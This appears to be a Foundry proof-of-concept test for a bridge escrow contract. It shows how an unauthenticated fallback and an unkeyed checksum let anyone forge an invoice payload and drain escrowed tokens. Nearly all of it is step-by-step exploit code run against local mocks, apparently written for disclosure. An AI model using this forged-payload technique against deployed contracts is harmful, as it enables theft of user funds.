// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import {Test, console} from "forge-std/Test.sol";
import {UnsafeUpgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";

import {BridgeEscrow} from "src/bridge/BridgeEscrow.sol";
import {StargateBridgeAdapter} from "src/bridge/adapters/StargateBridgeAdapter.sol";
import {InvoiceDataLib} from "src/bridge/InvoiceDataLib.sol";

import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

// forge-lint: disable-next-line(unaliased-plain-import)
import "test/mocks/tokens.sol";
// forge-lint: disable-next-line(unaliased-plain-import)
import "src/constants.sol";

/// @notice PoC: BridgeEscrow.fallback() is callable by anyone, and the protocol callback functions on the
///         registered adapters check `msg.sender == bridgeEscrow`. As a result an attacker can fabricate
///         a fully valid messagePayload (the checksum is keccak256 of public data — no signing key) and
///         pass it through escrow.fallback -> adapter.lzReceive -> escrow.releaseByInvoiceId, releasing
///         arbitrary amounts of any registered asset out of the escrow to an authorized account on the
///         destination chain — with NO bridge transfer ever arriving on-chain.
contract Poc_BridgeEscrowFallbackSpoof is Test {
    address public admin = makeAddr("admin");
    address public manager = makeAddr("manager");
    address public account = makeAddr("account");
    address public attacker = makeAddr("attacker");

    BridgeEscrow public destEscrow;
    StargateBridgeAdapter public destAdapter;
    Mock_ERC20 public usdc;

    uint64 public constant SOURCE_CHAIN_ID = 1;
    uint64 public constant DEST_CHAIN_ID = 10;
    string public constant USDC_SYMBOL = "USDC";
    bytes6 public constant USDC_SYMBOL_BYTES6 = "USDC  ";

    function setUp() public {
        vm.chainId(uint256(DEST_CHAIN_ID));
        usdc = new Mock_ERC20("USDC", 6);

        // Deploy escrow on destination chain
        address impl = address(new BridgeEscrow());
        address[] memory initialAccounts = new address[](1);
        initialAccounts[0] = account;
        address[] memory initialAdapters = new address[](0);
        address payable proxy = payable(UnsafeUpgrades.deployUUPSProxy(
                impl, abi.encodeCall(BridgeEscrow.initialize, (admin, DEST_CHAIN_ID, initialAccounts, initialAdapters))
            ));
        destEscrow = BridgeEscrow(proxy);

        // Grant MANAGER to admin (registerAsset is MANAGER-gated)
        vm.startPrank(admin);
        destEscrow.grantRole(MANAGER, admin);
        destEscrow.registerAsset(USDC_SYMBOL, address(usdc));
        vm.stopPrank();

        // Deploy Stargate adapter and register lzReceive callback
        address adapterImpl = address(new StargateBridgeAdapter());
        address adapterProxy = UnsafeUpgrades.deployUUPSProxy(
            adapterImpl,
            abi.encodeCall(
                StargateBridgeAdapter.initialize,
                (admin, address(destEscrow), address(0xBEEF), address(0xBEEF), "1.0.0")
            )
        );
        destAdapter = StargateBridgeAdapter(payable(adapterProxy));

        vm.startPrank(admin);
        destEscrow.authorizeAdapterWithCallback(adapterProxy, StargateBridgeAdapter.lzReceive.selector);
        vm.stopPrank();

        // Seed the escrow with USDC the attacker wants to drain
        usdc.mint(address(destEscrow), 1_000_000e6);
    }

    /// @notice Attacker drains the escrow with a forged payload that never crossed any bridge.
    function test_exploit_drainEscrowViaFallbackSpoof() public {
        uint256 stolen = 750_000e6;
        uint256 escrowBefore = usdc.balanceOf(address(destEscrow));
        uint256 accountBefore = usdc.balanceOf(account);

        // 1. Attacker fabricates a perfectly valid invoice payload — no key required.
        bytes32 invoiceId = _packInvoiceId(SOURCE_CHAIN_ID, DEST_CHAIN_ID, account, USDC_SYMBOL_BYTES6);
        uint64 ts = uint64(block.timestamp);
        bytes24 checksum24 = bytes24(keccak256(abi.encodePacked(invoiceId, stolen, ts)));
        InvoiceDataLib.InvoiceData memory fake = InvoiceDataLib.InvoiceData({
            invoiceId: invoiceId,
            sourceChainId: SafeCast.toUint24(SOURCE_CHAIN_ID),
            destinationChainId: SafeCast.toUint24(DEST_CHAIN_ID),
            account: account,
            assetSymbol: USDC_SYMBOL_BYTES6,
            amount: stolen,
            timestamp: ts,
            checksum24: checksum24
        });
        bytes memory payload = InvoiceDataLib.encode(fake);

        // 2. Encode an lzReceive call. The escrow.fallback() will receive it, look up the registered
        //    adapter for lzReceive's selector and forward via .call.
        bytes memory lzReceiveCalldata = abi.encodeWithSelector(
            StargateBridgeAdapter.lzReceive.selector,
            uint16(101), // _srcChainId — ignored by adapter
            bytes(""), // _srcAddress
            uint64(0), // _nonce
            payload // _payload (used)
        );

        // 3. Anyone (the attacker) calls the escrow with this data. There is no auth on fallback.
        vm.prank(attacker);
        (bool success,) = address(destEscrow).call(lzReceiveCalldata);
        assertTrue(success, "fallback dispatch must succeed");

        // 4. Funds are released out of the escrow even though no bridge message ever arrived.
        uint256 escrowAfter = usdc.balanceOf(address(destEscrow));
        uint256 accountAfter = usdc.balanceOf(account);
        console.log("escrow USDC before:", escrowBefore);
        console.log("escrow USDC after :", escrowAfter);
        console.log("account USDC before:", accountBefore);
        console.log("account USDC after :", accountAfter);
        console.log("amount drained from escrow:", escrowBefore - escrowAfter);

        assertEq(escrowAfter, escrowBefore - stolen, "escrow drained by attacker-forged payload");
        assertEq(accountAfter, accountBefore + stolen, "stolen funds sent to authorized account");

        // 5. The forged invoice is now marked completed on the destination — locking out any *real*
        //    bridge delivery for that (invoiceId, amount, timestamp). On the source chain the matching
        //    BRIDGING invoice (if it ever exists) is permanently stuck.
        bytes32 invoiceHash = bytes32(uint256(uint192(checksum24)));
        assertTrue(destEscrow.isInvoiceCompleted(invoiceHash), "forged invoice marked completed");
    }

    function _packInvoiceId(uint64 srcId, uint64 dstId, address acct, bytes6 sym) internal pure returns (bytes32) {
        return bytes32(
            (uint256(SafeCast.toUint24(srcId)) << 232) | (uint256(SafeCast.toUint24(dstId)) << 208)
                | (uint256(uint160(acct)) << 48) | uint256(uint48(sym))
        );
    }
}
